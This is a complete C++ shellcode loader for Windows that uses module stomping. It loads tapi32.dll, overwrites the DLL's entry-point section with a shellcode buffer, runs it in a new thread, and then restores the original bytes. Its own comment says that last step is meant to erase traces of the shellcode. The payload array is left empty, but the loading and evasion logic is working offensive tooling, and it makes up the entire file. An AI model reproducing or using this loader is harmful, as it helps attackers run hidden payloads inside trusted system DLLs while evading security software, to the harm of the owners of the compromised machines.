#include <Windows.h>
#include <iostream>

using namespace std;

int main()
{
	unsigned char shellcode[] = "";

	size_t virtualSize = 0;
	size_t length = sizeof(shellcode);

	cout << "[*] Shellcode address: " << (void*)shellcode << endl;
	
	char target_dll[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\tapi32.dll", target_dll, MAX_PATH);
	//HMODULE hModule = LoadLibraryEx("C:\\Users\\cys\\Desktop\\Dll1\\x64\\Release\\Dll1.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	HMODULE hModule = LoadLibraryEx(target_dll, NULL, DONT_RESOLVE_DLL_REFERENCES);
	cout << "[*] DLL base address: " << hModule << endl;

	// 解析 PE 文件格式，找到入口点地址
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		cerr << "[-] Invalid DOS header" << endl;
		return 1;
	}

	PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)hModule + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		cerr << "[-] Invalid NT header" << endl;
		return 1;
	}

	DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	PVOID entryPointAddress = (PVOID)((BYTE*)hModule + entryPointRVA);

	cout << "[*] Entry point address: " << entryPointAddress << endl;

	// 遍历节表，找到包含入口点的节
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
	DWORD sectionCount = pNtHeaders->FileHeader.NumberOfSections;

	for (DWORD i = 0; i < sectionCount; ++i) {
		DWORD sectionStartRVA = pSectionHeader[i].VirtualAddress;
		DWORD sectionEndRVA = sectionStartRVA + pSectionHeader[i].Misc.VirtualSize;

		if (entryPointRVA >= sectionStartRVA && entryPointRVA < sectionEndRVA) {
			virtualSize = pSectionHeader[i].Misc.VirtualSize;
			cout << "[*] Entry point is in section: " << (char*)pSectionHeader[i].Name << endl;
			cout << "[*] Section size: " << virtualSize << " bytes" << endl;
			cout << "[*] Shellcode size: " << length << " bytes" << endl;
			break;
		}
	}
	if (length > virtualSize) {
		cerr << "[-] Shellcode too big" << endl;
		return 1;
	}
	
	
	// 原始版本  PAGE_EXECUTE_READWRITE   PAGE_READWRITE  PAGE_EXECUTE_READ
	//DWORD oldProtect = 0;
	//VirtualProtect((LPVOID)entryPointAddress, length, PAGE_READWRITE, &oldProtect);
	//memcpy(entryPointAddress, shellcode, length);
	//memset(shellcode, 0, length);
	//VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &oldProtect);
	//HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);
	//WaitForSingleObject(hThread, INFINITE);

	// plus 版本，回填Dll，去除shellcode痕迹
	unsigned char* buffer = new unsigned char[length];
	memcpy(buffer, entryPointAddress, length);
	DWORD oldProtect = 0;
	VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READWRITE, &oldProtect);
	memcpy(entryPointAddress, shellcode, length);
	memset(shellcode, 0, length);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);
	Sleep(2500);
	memmove(entryPointAddress,buffer,length);
	VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &oldProtect);
	cout << "[*] Done" << endl;
	WaitForSingleObject(hThread, INFINITE);
	
	return 0;
}